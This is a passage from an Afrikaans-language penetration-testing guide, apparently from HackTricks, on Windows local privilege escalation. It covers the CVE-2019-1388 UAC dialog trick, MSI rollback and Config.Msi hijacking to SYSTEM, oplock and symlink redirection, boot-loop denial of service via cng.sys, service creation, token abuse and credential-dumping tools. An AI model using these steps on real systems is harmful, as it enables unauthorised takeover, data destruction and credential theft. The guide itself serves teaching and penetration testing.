1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Jy het al die nodige lêers en inligting in die volgende GitHub repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Van Administrator Medium na High Integrity Level / UAC Bypass

Lees dit om **meer oor Integrity Levels te leer**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lees dit dan om **meer oor UAC en UAC bypasses te leer:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Van Arbitrary Folder Delete/Move/Rename na SYSTEM EoP

Die tegniek wat [**in hierdie blogplasing**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beskryf word, met exploit code wat [**hier beskikbaar is**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Die aanval bestaan basies uit die misbruik van Windows Installer se rollback-funksie om wettige lêers tydens die deïnstallasieproses met kwaadwillige lêers te vervang. Hiervoor moet die aanvaller ’n **kwaadwillige MSI installer** skep wat gebruik sal word om die `C:\Config.Msi`-folder te kaap. Hierdie folder sal later deur Windows Installer gebruik word om rollback-lêers tydens die deïnstallasie van ander MSI packages te stoor, waar die rollback-lêers gewysig sou wees om die kwaadwillige payload te bevat.

Die opgesomde tegniek is soos volg:

1. **Stage 1 – Voorbereiding vir die Kaap (hou `C:\Config.Msi` leeg)**

- Step 1: Installeer die MSI
- Skep ’n `.msi` wat ’n onskadelike lêer (byvoorbeeld `dummy.txt`) in ’n skryfbare folder (`TARGETDIR`) installeer.
- Merk die installer as **"UAC Compliant"**, sodat ’n **non-admin user** dit kan uitvoer.
- Hou ’n **handle** na die lêer oop ná die installasie.

- Step 2: Begin die Deïnstallasie
- Deïnstalleer dieselfde `.msi`.
- Die deïnstallasieproses begin lêers na `C:\Config.Msi` skuif en hulle na `.rbf`-lêers hernoem (rollback backups).
- **Poll die oop lêerhandle** met `GetFinalPathNameByHandle` om vas te stel wanneer die lêer `C:\Config.Msi\<random>.rbf` word.

- Step 3: Custom Syncing
- Die `.msi` sluit ’n **custom uninstall action (`SyncOnRbfWritten`)** in wat:
- ’n Sein stuur wanneer `.rbf` geskryf is.
- Dan op ’n ander event wag voordat die deïnstallasie voortgaan.

- Step 4: Blokkeer die Verwydering van `.rbf`
- Wanneer dit gesein word, **open die `.rbf`-lêer** sonder `FILE_SHARE_DELETE` — dit **verhoed dat dit verwyder word**.
- Stuur dan ’n sein terug sodat die deïnstallasie kan voltooi.
- Windows Installer kan nie die `.rbf` verwyder nie, en omdat dit nie al die inhoud kan verwyder nie, word `C:\Config.Msi` **nie verwyder nie**.

- Step 5: Verwyder `.rbf` Handmatig
- Jy (die aanvaller) verwyder die `.rbf`-lêer handmatig.
- Nou is `C:\Config.Msi` leeg en gereed om gekaap te word.

> Op hierdie punt, **aktiveer die SYSTEM-level arbitrary folder delete vulnerability** om `C:\Config.Msi` te verwyder.

2. **Stage 2 – Vervang Rollback Scripts met Kwaadwillige Scripts**

- Step 6: Skep `C:\Config.Msi` opnuut met Weak ACLs
- Skep die `C:\Config.Msi`-folder self opnuut.
- Stel **weak DACLs** (byvoorbeeld Everyone:F) en **hou ’n handle oop** met `WRITE_DAC`.

- Step 7: Voer Nog ’n Installasie Uit
- Installeer die `.msi` weer, met:
- `TARGETDIR`: Skryfbare ligging.
- `ERROROUT`: ’n Veranderlike wat ’n gedwonge mislukking veroorsaak.
- Hierdie installasie sal gebruik word om weer **rollback** te aktiveer, wat `.rbs` en `.rbf` lees.

- Step 8: Monitor vir `.rbs`
- Gebruik `ReadDirectoryChangesW` om `C:\Config.Msi` te monitor totdat ’n nuwe `.rbs` verskyn.
- Leg die lêernaam vas.

- Step 9: Sync voor Rollback
- Die `.msi` bevat ’n **custom install action (`SyncBeforeRollback`)** wat:
- ’n Event sein wanneer die `.rbs` geskep word.
- Dan wag voordat dit voortgaan.

- Step 10: Pas Weak ACL Weer Toe
- Nadat jy die `.rbs created`-event ontvang het:
- Pas Windows Installer **strong ACLs** weer op `C:\Config.Msi` toe.
- Maar omdat jy steeds ’n handle met `WRITE_DAC` het, kan jy **weak ACLs** weer toepas.

> ACLs word **slegs afgedwing wanneer ’n handle geopen word**, dus kan jy steeds na die folder skryf.

- Step 11: Plaas Vals `.rbs` en `.rbf`
- Oorskryf die `.rbs`-lêer met ’n **vals rollback script** wat aan Windows sê om:
- Jou `.rbf`-lêer (kwaadwillige DLL) na ’n **bevoorregte ligging** terug te stel (byvoorbeeld `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Plaas jou vals `.rbf` wat ’n **kwaadwillige SYSTEM-level payload DLL** bevat.

- Step 12: Aktiveer die Rollback
- Sein die sync-event sodat die installer voortgaan.
- ’n **type 19 custom action (`ErrorOut`)** is gekonfigureer om die installasie **doelbewus op ’n bekende punt te laat misluk**.
- Dit veroorsaak dat **rollback begin**.

- Step 13: SYSTEM Installeer Jou DLL
- Windows Installer:
- Lees jou kwaadwillige `.rbs`.
- Kopieer jou `.rbf` DLL na die teikenligging.
- Jy het nou jou **kwaadwillige DLL in ’n SYSTEM-gelaaide pad**.

- Finale Stap: Voer SYSTEM Code Uit
- Voer ’n vertroude **auto-elevated binary** uit (byvoorbeeld `osk.exe`) wat die DLL laai wat jy gekaap het.
- **Boom**: Jou code word **as SYSTEM** uitgevoer.


### Van Arbitrary File Delete/Move/Rename na SYSTEM EoP

Die hoof-MSI rollback-tegniek (die vorige een) veronderstel dat jy ’n **hele folder** (byvoorbeeld `C:\Config.Msi`) kan verwyder. Maar wat as jou vulnerability slegs **arbitrary file deletion** toelaat?

Jy kan **NTFS internals** misbruik: elke folder het ’n versteekte alternate data stream genaamd:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Hierdie stroom stoor die **indeks-metadata** van die vouer.

Dus, as jy die `::$INDEX_ALLOCATION`-stroom van ’n vouer **uitvee**, verwyder NTFS **die hele vouer** uit die lêerstelsel.

Jy kan dit doen met standaard-API’s vir lêeruitvee, soos:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Alhoewel jy ’n *file* delete API oproep, **delete dit die folder self**.

### Van die uitvee van Folder Contents na SYSTEM EoP
Wat as jou primitive jou nie toelaat om arbitrêre files/folders te delete nie, maar dit **wel die deletion van die *contents* van ’n attacker-controlled folder toelaat**?

1. Step 1: Stel ’n lokfolder en -file op
- Create: `C:\temp\folder1`
- Binne-in dit: `C:\temp\folder1\file1.txt`

2. Step 2: Plaas ’n **oplock** op `file1.txt`
- Die oplock **pause execution** wanneer ’n privileged process probeer om `file1.txt` te delete.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Stap 3: Aktiveer SYSTEM-proses (bv. `SilentCleanup`)
- Hierdie proses skandeer vouers (bv. `%TEMP%`) en probeer om die inhoud daarvan te verwyder.
- Wanneer dit by `file1.txt` kom, **oplock word geaktiveer** en beheer word aan jou callback oorgedra.

4. Stap 4: Binne die oplock callback – herlei die verwydering

- Opsie A: Skuif `file1.txt` elders
- Dit maak `folder1` leeg sonder om die oplock te verbreek.
- Moenie `file1.txt` direk verwyder nie — dit sal die oplock voortydig vrystel.

- Opsie B: Skakel `folder1` om na ’n **junction**:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Opsie C: Skep ’n **symlink** in `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Dit teiken die interne NTFS-stroom wat vouermetadata stoor — as jy dit uitvee, vee jy die vouer uit.

5. Step 5: Release the oplock
- SYSTEM-proses gaan voort en probeer om `file1.txt` uit te vee.
- Maar nou, weens die junction + symlink, vee dit eintlik die volgende uit:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Resultaat**: `C:\Config.Msi` word deur SYSTEM verwyder.

### Van Arbitrary Folder Create na Permanent DoS

Exploit ’n primitive waarmee jy ’n arbitrary folder as SYSTEM/admin kan **create** — selfs al **kan jy nie files write** of **weak permissions set** nie.

Create ’n **folder** (nie ’n file nie) met die naam van ’n **critical Windows driver**, byvoorbeeld:
```
C:\Windows\System32\cng.sys
```
- Hierdie pad stem normaalweg ooreen met die `cng.sys` kernel-mode driver.
- As jy dit **vooraf as ’n vouer skep**, kan Windows nie die werklike driver tydens selflaai laai nie.
- Daarna probeer Windows om `cng.sys` tydens selflaai te laai.
- Dit sien die vouer, **kan nie die werklike driver oplos nie**, en **crash of stop die selflaaiproses**.
- Daar is **geen fallback** en **geen herstel** sonder eksterne ingryping nie (bv. boot repair of skyftoegang).

### Van bevoorregte log-/rugsteunpaaie + OM symlinks na willekeurige lêeroorskryf / boot DoS

Wanneer ’n **bevoorregte diens** logs/exports skryf na ’n pad wat uit ’n **skryfbare config** gelees word, herlei daardie pad met **Object Manager symlinks + NTFS mount points** om die bevoorregte skryfbewerking in ’n willekeurige oorskrywing te verander (selfs **sonder** SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Vereistes**
- Die config wat die teikenpad stoor, is skryfbaar vir die aanvaller (bv. `%ProgramData%\...\.ini`).
- Vermoë om ’n mount point na `\RPC Control` en ’n OM file symlink te skep (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- ’n Bevoorregte bewerking wat na daardie pad skryf (log, export, report).

**Voorbeeldketting**
1. Lees die config om die bevoorregte logbestemming te herwin, bv. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Herlei die pad sonder admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Wag vir die bevoorregte komponent om die log te skryf (bv. admin aktiveer "stuur toets-SMS"). Die skrywing beland nou in `C:\Windows\System32\cng.sys`.
4. Inspekteer die oorskryfde teiken (hex/PE parser) om korrupsie te bevestig; ’n herlaai dwing Windows om die gemanipuleerde driver-pad te laai → **boot loop DoS**. Dit veralgemeen ook na enige beskermde lêer wat ’n bevoorregte diens vir skryfwerk sal oopmaak.

> `cng.sys` word normaalweg vanaf `C:\Windows\System32\drivers\cng.sys` gelaai, maar as ’n kopie in `C:\Windows\System32\cng.sys` bestaan, kan dit eerste probeer word, wat dit ’n betroubare DoS-sink vir korrupte data maak.



## **Van High Integrity na System**

### **Nuwe diens**

As jy reeds op ’n High Integrity-proses loop, kan die **pad na SYSTEM** maklik wees deur eenvoudig ’n nuwe diens **te skep en uit te voer**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Wanneer jy 'n service binary skep, maak seker dit is 'n geldige service of dat die binary die nodige aksies vinnig uitvoer, aangesien dit binne 20s beëindig sal word as dit nie 'n geldige service is nie.

### AlwaysInstallElevated

Vanuit 'n High Integrity-proses kan jy probeer om die **AlwaysInstallElevated-registerinskrywings te enable** en 'n reverse shell te **install** met 'n _**.msi**_-wrapper.\
[Meer inligting oor die betrokke register keys en hoe om 'n _.msi_-package te install, is hier beskikbaar.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Jy kan** [**die code hier vind**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

As jy daardie token privileges het (jy sal dit waarskynlik in 'n reeds bestaande High Integrity-proses vind), sal jy **byna enige proses** (nie protected processes nie) met die SeDebug privilege kan **open**, die **token van die proses kan copy**, en 'n **arbitrary process met daardie token kan skep**.\
Deur hierdie tegniek te gebruik, word gewoonlik **enige proses wat as SYSTEM loop met al die token privileges gekies** (_ja, jy kan SYSTEM-prosesse sonder al die token privileges vind_).\
**Jy kan 'n** [**code-voorbeeld wat die voorgestelde tegniek uitvoer, hier vind**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Hierdie tegniek word deur meterpreter gebruik om in `getsystem` te escalate. Die tegniek bestaan uit **die skep van 'n pipe en daarna die skep/misbruik van 'n service om op daardie pipe te skryf**. Dan sal die **server** wat die pipe met die **`SeImpersonate`** privilege geskep het, die **token van die pipe-client kan impersonate** (die service), waardeur SYSTEM privileges verkry word.\
As jy [**meer oor name pipes wil leer, moet jy dit lees**](#named-pipe-client-impersonation).\
As jy 'n voorbeeld wil lees van [**hoe om van high integrity na System te gaan met name pipes, moet jy dit lees**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

As jy daarin slaag om 'n dll wat deur 'n **proses** wat as **SYSTEM** loop, te **hijack** en wat deur daardie proses **gelaai** word, sal jy arbitrary code met daardie permissions kan uitvoer. Daarom is Dll Hijacking ook nuttig vir hierdie soort privilege escalation, en dit is boonop **baie makliker om vanuit 'n high integrity-proses te bereik**, aangesien dit **write permissions** op die folders sal hê wat gebruik word om dlls te laai.\
**Jy kan** [**hier meer oor Dll hijacking leer**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Lees:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Meer hulp

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Nuttige tools

**Beste tool om Windows local privilege escalation vectors te vind:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Kontroleer vir misconfigurations en sensitive files (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Bespeur.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Kontroleer vir sommige moontlike misconfigurations en versamel inligting (**[**kyk hier**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Kontroleer vir misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Dit onttrek gestoorde session-inligting van PuTTY, WinSCP, SuperPuTTY, FileZilla en RDP. Gebruik -Thorough in local.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Onttrek credentials uit Credential Manager. Bespeur.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray versamelde passwords oor die domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh is 'n PowerShell ADIDNS/LLMNR/mDNS-spoofer en man-in-the-middle-tool.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basiese privesc Windows-enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Soek vir bekende privesc-vulnerabilities (DEPRECATED vir Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Admin-regte benodig)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Soek vir bekende privesc-vulnerabilities (moet met VisualStudio compiled word) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumerateer die host op soek na misconfigurations (meer 'n gather-info-tool as privesc) (moet compiled word) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Onttrek credentials uit baie software (precompiled exe in github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port van PowerUp na C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Kontroleer vir misconfiguration (executable precompiled in github). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Kontroleer vir moontlike misconfigurations (exe vanaf python). Nie aanbeveel nie. Dit werk nie goed in Win10 nie.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Tool geskep op grond van hierdie post (dit benodig nie accesschk om behoorlik te werk nie, maar dit kan dit gebruik).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Lees die output van **systeminfo** en beveel werkende exploits aan (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Lees die output van **systeminfo** en beveel werkende exploits aan (local Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Jy moet die project met die korrekte weergawe van .NET compile ([**sien dit hier**](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Om die geïnstalleerde weergawe van .NET op die victim host te sien, kan jy doen:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Grondbeginsels van Windows-privilege-escalasie](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Verhoog privileges deur swak vouertoestemmings uit te buit](http://www.greyhathacker.net/?p=738)
- [3] [Windows-privilege-escalasie - 'n cheatsheet](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows-aanvalle: AT is die nuwe swart (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Gids vir Windows-privilege-escalasie](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation-kontrolelys](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Windows-privilege-eskalasiemetodes vir Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Word VBA-makro-phishing via SMTP → hMailServer-geloofsbriefdekripsie → Veeam CVE-2023-27532 na SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) en kerntoken-diefstal](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Jag op die Silver Fox: Kat en muis in kernelskaduwees](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Bevoorregte lêerstelselkwesbaarheid teenwoordig in 'n SCADA-stelsel](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Simboliese-skakeltoetsnutsgoed – CreateSymlink-gebruik](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [A Link to the Past. Misbruik van simboliese skakels op Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF-poort)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Gevaarlike module-resolusie op Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js-modules: laai vanaf `node_modules`-vouers](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++-kontrolelysuitdagings, opgelos](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues-funksie](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: Deur CLDFLT- en DirectX-kernellooptoestande te ketting vir Windows-LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Een I/O Ring om hulle almal te beheer: 'n Volledige lees/skryf-exploit-primitief op Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Misbruik van arbitrêre lêerskrapings om privilege te eskaleer en ander wonderlike truuks](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs-exploitkode](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS-aanvalle Deel 2: CVE-2020-1013, 'n Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Verkenning van Credential Manager en Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation When An Image Change Leads To A Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Onttrekking van SSH-private sleutels uit Windows 10 SSH-agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Verander Enterprise-opdateringsbedieners in backdoor-fabrieke (0_o) – Deel 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Verander Enterprise-opdateringsbedieners in backdoor-fabrieke (0_o) – Deel 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
